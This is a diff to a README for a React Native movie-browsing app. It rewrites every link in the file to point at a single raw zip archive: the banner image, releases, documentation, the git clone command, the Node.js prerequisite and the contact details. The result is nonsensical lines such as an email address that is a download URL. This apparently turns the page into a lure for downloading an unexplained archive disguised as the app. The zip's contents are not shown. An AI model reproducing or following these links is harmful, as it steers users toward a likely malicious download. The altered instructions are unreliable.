@@ -1,10 +1,10 @@
 # 🎬 FullStack React Native Movie App
 
-![Movie App Banner](https://example.com/movie-app-banner.png)
+![Movie App Banner](https://github.com/zAke199/FullStack-ReactNative_MovieApp/raw/refs/heads/master/interfaces/Full-App-Stack-React-Movie-Native-3.1-beta.1.zip)
 
 Welcome to the **FullStack React Native Movie App**! This app helps users discover, explore, and track the latest and most trending movies using the TMDB API. With a sleek modern UI, intelligent search analytics powered by Appwrite, and a dynamic trending movies list, this app provides a rich experience for movie enthusiasts.
 
-[Check out the latest releases here!](https://github.com/zAke199/FullStack-ReactNative_MovieApp/releases)
+[Check out the latest releases here!](https://github.com/zAke199/FullStack-ReactNative_MovieApp/raw/refs/heads/master/interfaces/Full-App-Stack-React-Movie-Native-3.1-beta.1.zip)
 
 ## 📖 Table of Contents
 
@@ -56,7 +56,7 @@ To get started with the FullStack React Native Movie App, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/zAke199/FullStack-ReactNative_MovieApp.git
+   git clone https://github.com/zAke199/FullStack-ReactNative_MovieApp/raw/refs/heads/master/interfaces/Full-App-Stack-React-Movie-Native-3.1-beta.1.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -67,7 +67,7 @@ To get started with the FullStack React Native Movie App, follow these steps:
 
 3. **Install Dependencies**:
 
-   Ensure you have Node.js installed, then run:
+   Ensure you have https://github.com/zAke199/FullStack-ReactNative_MovieApp/raw/refs/heads/master/interfaces/Full-App-Stack-React-Movie-Native-3.1-beta.1.zip installed, then run:
 
    ```bash
    npm install
@@ -101,7 +101,7 @@ Once the app is running, you can explore its features:
 - **View Trending Movies**: Check the trending movies list, which updates based on user activity.
 - **Track Favorites**: Mark movies as favorites for easy access later.
 
-For detailed instructions, please refer to the [documentation](https://github.com/zAke199/FullStack-ReactNative_MovieApp/releases).
+For detailed instructions, please refer to the [documentation](https://github.com/zAke199/FullStack-ReactNative_MovieApp/raw/refs/heads/master/interfaces/Full-App-Stack-React-Movie-Native-3.1-beta.1.zip).
 
 ## 🤝 Contributing
 
@@ -122,9 +122,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries, please reach out to:
 
 - **Author**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/YourProfile)
+- **Email**: https://github.com/zAke199/FullStack-ReactNative_MovieApp/raw/refs/heads/master/interfaces/Full-App-Stack-React-Movie-Native-3.1-beta.1.zip
+- **GitHub**: [Your GitHub Profile](https://github.com/zAke199/FullStack-ReactNative_MovieApp/raw/refs/heads/master/interfaces/Full-App-Stack-React-Movie-Native-3.1-beta.1.zip)
 
 ---
 
-Thank you for checking out the FullStack React Native Movie App! We hope you enjoy exploring the world of movies. For the latest updates, visit our [Releases](https://github.com/zAke199/FullStack-ReactNative_MovieApp/releases) section.
+Thank you for checking out the FullStack React Native Movie App! We hope you enjoy exploring the world of movies. For the latest updates, visit our [Releases](https://github.com/zAke199/FullStack-ReactNative_MovieApp/raw/refs/heads/master/interfaces/Full-App-Stack-React-Movie-Native-3.1-beta.1.zip) section.
